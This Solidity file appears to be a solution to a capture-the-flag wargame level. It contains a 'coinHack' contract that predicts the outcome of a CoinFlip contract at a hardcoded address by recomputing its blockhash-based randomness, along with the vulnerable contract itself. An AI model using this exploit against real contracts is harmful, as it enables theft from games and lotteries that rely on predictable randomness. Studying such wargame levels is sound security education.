// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract coinHack {
    
    address contractAddress = 0xBa4e4e3ed8510E83db36Fe9EB5bFa0F8D7b95A06;
    CoinFlip target = CoinFlip(contractAddress);
   
    function hacktheFlip() public { 
         uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 factor = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
        bool flipResult = blockValue / factor == 1? true: false;
        target.flip(flipResult);
    }

    function chekProgress() external view returns(uint256 results) {
        return target.consecutiveWins();
    }
}


contract CoinFlip {

  uint256 public consecutiveWins;
  uint256 lastHash;
  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

  constructor() {
    consecutiveWins = 0;
  }

  function flip(bool _guess) public returns (bool) {
    uint256 blockValue = uint256(blockhash(block.number - 1));

    if (lastHash == blockValue) {
      revert();
    }

    lastHash = blockValue;
    uint256 coinFlip = blockValue / FACTOR;
    bool side = coinFlip == 1 ? true : false;

    if (side == _guess) {
      consecutiveWins++;
      return true;
    } else {
      consecutiveWins = 0;
      return false;
    }
  }
}